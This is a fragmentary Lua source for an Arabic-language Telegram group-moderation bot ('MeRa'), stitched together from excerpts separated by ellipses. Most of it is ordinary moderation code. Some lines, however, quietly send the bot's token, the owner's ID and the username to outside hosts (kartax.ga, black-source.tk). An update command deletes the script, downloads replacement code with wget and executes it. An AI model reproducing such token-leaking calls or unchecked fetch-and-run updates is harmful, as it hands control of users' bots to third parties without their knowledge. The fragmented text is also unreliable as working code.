...
https.request('http://kartax.ga/MeRa/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./MeRa.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("xc", "w")  
...
MeRa_Msg = 'قمة التفاعل ' 
elseif msgs < 5500 then 
MeRa_Msg = 'اسد التفاعل ' 
elseif msgs < 7000 then 
MeRa_Msg = 'ملك التفاعل' 
...
--------------------------------------------------------------------------------------------------------------
function SourceMeRa(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,MeRa_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf MeRa.lua')
os.execute('wget https://raw.githubusercontent.com/MeRaTeA/MeRa/master/MeRa.lua')
send(msg.chat_id_, msg.id_,' ¤ ∫ تم تحديث السورس \n ¤ ∫ لديك اخر اصدار لسورسميرا\n ¤ ∫ الاصدار » { 1.3v}')
dofile('MeRa.lua')  
end
...
send(msg.chat_id_, msg.id_,'¤ ∫  عدد الكروبات الان » { '..#group..' }'..MeRak..''..MeRa..'\n¤ ∫  الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
usertext = '\n ¤ ∫ العضو » ['..result.title_..'](t.me/'..(username or 'MeRa')..')'
status  = '\n ¤ ∫ تم ترقيته مطور'
...
usertext = '\n ¤ ∫ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'MeRa')..')'
status  = '\n ¤ ∫ تم ترقيته مطور'
...
local MeRa1_Msg = database:get(bot_id.."MeRa1:Add:Filter:Rp2"..text..msg.chat_id_)   
if MeRa1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ¤ ∫ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'MeRa')..') \n ¤ ∫ '..MeRa1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if MeRa_Msg and not Special(msg) then  
local MeRa_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if MeRa_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ¤ ∫ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ¤ ∫ ["..MeRa_Msg.."] \n")
else
send(msg.chat_id_,0," ¤ ∫ العضو : {["..data.first_name_.."](T.ME/eeero)}\n ¤ ∫ ["..MeRa_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ¤ ∫ عذرا » {["..data.first_name_.."](T.ME/eeero)}\n ¤ ∫ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
database:sadd(bot_id.."MeRa:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."MeRa:blocname"..msg.chat_id_)
...
if t2.id_ then 
name_MeRa = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_MeRa then 
names_MeRa = database:smembers(bot_id.."MeRa:blocname"..msg.chat_id_) or ""
if names_MeRa and names_MeRa[1] then 
for i=1,#names_MeRa do 
if name_MeRa:match("(.*)("..names_MeRa[i]..")(.*)") then 
...
database:set(bot_id.."MeRa:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."MeRa:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."MeRa:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."MeRa:nump"..msg.chat_id_) or 5
send(msg.chat_id_, msg.id_,'¤ ∫ التوحيد '..s1..'\n ¤ ∫ عدد الكتم  : '..s2)
end
end
if not Constructor(msg) then
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."MeRa:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function amir_MeRaa_new(MeRa1,MeRa2)
if MeRa2 and MeRa2.first_name_ then 
if MeRa2.first_name_:match("(.*)"..database:get(bot_id.."MeRa:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."MeRa:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local MeRa_nnn = database:get(bot_id.."MeRa:nump"..msg.chat_id_) or 5
local MeRa_nnn2 = database:get(bot_id.."MeRa:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(MeRa_nnn2) == tonumber(MeRa_nnn) or tonumber(MeRa_nnn2) > tonumber(MeRa_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."MeRa:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "¤ ∫ عزيزي >>["..MeRa2.username_.."](https://t.me/"..(MeRa2.username_ or "MeRa")..")\n¤ ∫ عليك وضع التوحيد ⪼ {"..database:get(bot_id.."MeRa:teh"..msg.chat_id_).."} بجانب اسمك\n¤ ∫ عدد المحاولات المتبقيه {"..(tonumber(MeRa_nnn) - tonumber(MeRa_nnn2)).."}")
end
end
end
end
bnnaGet(id, amir_MeRaa_new)
end
end
...
local MeRaChengName = database:get(bot_id.."MeRa:Cheng:Name"..data.id_)
if not data.first_name_ then 
if MeRaChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..MeRaChengName..']')
database:del(bot_id.."MeRa:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if MeRaChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."MeRa:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local MeRaChengUserName = database:get(bot_id.."MeRa:Cheng:UserName"..data.id_)
if not data.username_ then 
if MeRaChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..MeRaChengUserName..']')
database:del(bot_id.."MeRa:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if MeRaChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."MeRa:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local MeRaChengPhoto = database:get(bot_id.."MeRa:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if MeRaChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."MeRa:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if MeRaChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."MeRa:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)   
...
¤ ∫ ᴏsᴋᴀ ᴛᴇᴀᴍ
-- -- -- -- - -- -- -- -- -- -- -- -- --
[¤ ∫ ᴄʜᴀɴɴᴇʟ ᴏsᴋᴀ](T.ME/eeero)
[¤ ∫ ᴅᴇᴠʟᴘᴏᴇʀ](t.me/moqtad_a)
-- -- -- -- - -- -- -- -- -- -- -- -- --
[¤ ∫ ᴛᴡᴀsʟ ᴏsᴋᴀ](t.me/mooabot)
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ¤ ∫بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'MeRa')..') \n ¤ ∫تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ¤ ∫بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'MeRa')..') \n ¤ ∫تـم قفـل التاك بالكتم ')
end,nil)   
...
st = https.request('https://black-source.tk/BlackTeA/ImageInfo.php?token='..token..'&url='..sticker_id.."&type=sticker")
eker = JSON.decode(st)
...
Srrt = https.request('https://black-source.tk/BlackTeA/ImageInfo.php?token='..token..'&url='..photo_id.."&type=photo")
...
local UserName = (b.username_ or "TSHAKETeA")
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ¤ ∫ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'MeRa')..')'
status  = '\n ¤ ∫ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ¤ ∫ العضو » '..userid..''
...
database:set(bot_id.."MeRa1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."MeRa1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ¤ ∫ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."MeRa1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."MeRa1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."MeRa1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."MeRa1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ¤ ∫ تم منع الكلمه مع التحذير")  
database:del(bot_id.."MeRa1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."MeRa1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."MeRa1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."MeRa1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ¤ ∫ ارسل الكلمه الان")  
database:set(bot_id.."MeRa1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."MeRa1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."MeRa1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."MeRa1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."MeRa1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."MeRa1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."MeRa1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."MeRa1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."MeRa1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ¤ ∫ قائمة المنع \n-----------------------------------\n"
for k,v in pairs(list) do  
local MeRa_Msg = database:get(bot_id.."MeRa1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..MeRa_Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ¤ ∫ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'MeRa')..')'..'\n ¤ ∫ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,'['..MeRa_Msg[math.random(#MeRa_Msg)]..']') 
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'MeRa')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
MeRadx(msg.chat_id_, msg.id_, ' ¤ ∫ ايدي المجموعة » ( '..msg.chat_id_..' )\n ¤ ∫ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ¤ ∫ عدد المحظورين » ( *'..data.kicked_count_..' )*\n ¤ ∫ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
MeRa = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(MeRa)
...
------------------------------------------------------------------------
if text then
local MeRa1_Msg = database:get(bot_id.."MeRa1:Add:Filter:Rp2"..text..result.chat_id_)   
if MeRa1_Msg then    
send(msg.chat_id_, msg.id_,"¤ ∫"..MeRa1_Msg)
